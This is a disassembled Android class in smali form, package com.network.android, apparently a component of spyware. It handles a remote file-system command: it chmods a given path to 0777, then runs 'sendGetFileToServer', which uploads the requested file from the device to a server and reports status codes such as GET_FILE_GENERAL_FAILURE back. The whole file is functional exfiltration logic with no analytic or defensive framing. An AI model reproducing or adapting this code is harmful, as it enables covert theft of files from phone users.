.class final Lcom/network/android/n;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:I

.field final synthetic c:Landroid/content/Context;

.field final synthetic d:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;ILandroid/content/Context;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/n;->a:Ljava/lang/String;

    iput p2, p0, Lcom/network/android/n;->b:I

    iput-object p3, p0, Lcom/network/android/n;->c:Landroid/content/Context;

    iput-object p4, p0, Lcom/network/android/n;->d:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 8

    const/4 v7, 0x1

    :try_start_0
    iget-object v0, p0, Lcom/network/android/n;->a:Ljava/lang/String;

    invoke-static {v0}, Lcom/network/android/m;->b(Ljava/lang/String;)Ljava/util/HashMap;

    move-result-object v1

    const-string v0, "0777"

    iget-object v2, p0, Lcom/network/android/n;->a:Ljava/lang/String;

    invoke-static {v0, v2}, Lcom/network/android/m;->b(Ljava/lang/String;Ljava/lang/String;)V

    iget v0, p0, Lcom/network/android/n;->b:I

    if-ne v7, v0, :cond_3

    if-nez v1, :cond_0

    const-string v0, "parseFileSystemCommand get chmod data failed. "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    iget-object v0, p0, Lcom/network/android/n;->c:Landroid/content/Context;

    iget-object v0, p0, Lcom/network/android/n;->a:Ljava/lang/String;

    iget-object v2, p0, Lcom/network/android/n;->d:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "sendGetFileToServer starting. getting file: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/i/e;->b()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_1

    const-string v0, "sendGetFileToServer file does not exists. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    const/16 v3, 0x77

    const-string v4, "GET_FILE_FILE_DOES_NOT_EXISTS"

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v0, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v0, 0x0

    const/16 v3, -0x3cae

    const-string v4, ""

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v0, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    :goto_0
    :try_start_2
    iget-object v0, p0, Lcom/network/android/n;->a:Ljava/lang/String;

    invoke-static {v1, v0}, Lcom/network/android/m;->a(Ljava/util/HashMap;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    :goto_1
    return-void

    :cond_1
    :try_start_3
    invoke-virtual {v4}, Ljava/io/File;->length()J

    move-result-wide v4

    long-to-int v4, v4

    if-nez v4, :cond_2

    const-string v0, "sendGetFileToServer file size is 0"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    const/16 v3, 0x75

    const-string v4, "GET_FILE_EMPTY_DIR_OR_FILE"

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v0, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v0, 0x0

    const/16 v3, -0x3cae

    const-string v4, ""

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v0, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const/4 v3, 0x0

    const/16 v4, 0x74

    :try_start_4
    const-string v5, "GET_FILE_GENERAL_FAILURE"

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-static {v3, v4, v5, v6}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v3, 0x0

    const/16 v4, -0x3cae

    const-string v5, ""

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v3, v4, v5, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "sendGetFileToServer exception"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "parseFileSystemCommand Send Data List Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    const/16 v0, 0x18

    invoke-static {v7, v0}, Lcom/network/android/c/a/b;->a(IS)V

    goto :goto_1

    :cond_2
    :try_start_5
    invoke-static {v2}, Lcom/network/android/c/a/b;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/i/b;->a()Lcom/network/i/b;

    const/4 v4, 0x0

    const/4 v5, 0x1

    invoke-static {v0, v3, v4, v5, v2}, Lcom/network/i/b;->a(Ljava/lang/String;Ljava/lang/String;IILjava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_0

    goto/16 :goto_0

    :cond_3
    :try_start_6
    iget-object v0, p0, Lcom/network/android/n;->a:Ljava/lang/String;

    iget-object v2, p0, Lcom/network/android/n;->c:Landroid/content/Context;

    iget-object v3, p0, Lcom/network/android/n;->d:Ljava/lang/String;

    invoke-static {v0, v2, v3}, Lcom/network/android/m;->a(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_1

    goto/16 :goto_0
.end method
